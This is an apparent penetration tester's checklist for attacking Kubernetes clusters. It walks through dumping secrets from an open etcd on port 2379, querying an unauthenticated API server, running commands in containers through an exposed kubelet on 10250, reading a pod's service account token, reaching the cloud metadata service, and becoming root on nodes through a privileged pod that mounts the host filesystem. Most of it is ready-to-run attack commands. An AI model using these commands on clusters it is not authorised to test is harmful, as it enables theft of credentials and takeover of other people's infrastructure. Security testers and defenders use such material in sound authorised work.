# Kubernetes

## Before I start
- [ ] The ports: 6443 or 8443 the API server, 2379 etcd, 10250 the kubelet, 8001 the dashboard, 30000 and up NodePorts
kube-hunter, from https://github.com/aquasecurity/kube-hunter, lists what a node exposes:
pipx install kube-hunter
kube-hunter --remote <TargetIP>

## etcd on 2379: the whole cluster's state
etcdctl, after sudo apt install -y etcd-client:
etcdctl --endpoints=http://<TargetIP>:2379 get / --prefix --keys-only
etcdctl --endpoints=http://<TargetIP>:2379 get /registry/secrets --prefix
- [ ] Secrets are only base64: service account tokens, registry credentials and TLS keys, decoded and kept
- [ ] An etcd I can write: any object's specification changed

## The API server, with no login
kubectl, after sudo apt install -y kubernetes-client:
curl -sk https://<TargetIP>:6443/api/v1/secrets
kubectl --server=https://<TargetIP>:6443 --insecure-skip-tls-verify get pods --all-namespaces
- [ ] system:anonymous with rights, from an old AlwaysAllow setting: cluster administrator
- [ ] 403 from the default deny: the kubelet next

## The kubelet on 10250: commands on one node
curl -sk https://<TargetIP>:10250/runningpods/ | jq
With THE-NAMESPACE, THE-POD and THE-CONTAINER from that list:
curl -sk -X POST https://<TargetIP>:10250/run/THE-NAMESPACE/THE-POD/THE-CONTAINER -d 'cmd=id'
- [ ] kubeletctl, from https://github.com/cyberark/kubeletctl/releases, does both across nodes: kubeletctl scan finds open kubelets, and kubeletctl run runs a command in a container

## Already inside a pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" --server=https://kubernetes.default.svc --insecure-skip-tls-verify auth can-i --list
- [ ] get on secrets in kube-system is close to cluster administrator
- [ ] The cloud's metadata service from the pod: the node's IAM role, often wider than it should be

## Cluster administrator to root on the nodes
- [ ] A privileged pod that mounts the node's / and chroots into it is root on that node, and one on each node is root on all of them: the same mount as in :Pb docker-api

## If it fails
- [ ] A login needed everywhere: service account tokens in repositories and CI, applications on NodePorts, and a dashboard on 8001 with no login

## Next
- [ ] Root on a node: :Pb linux-creds
- [ ] Cloud credentials: the cloud account they open; out of a container: :Pb docker-lxd
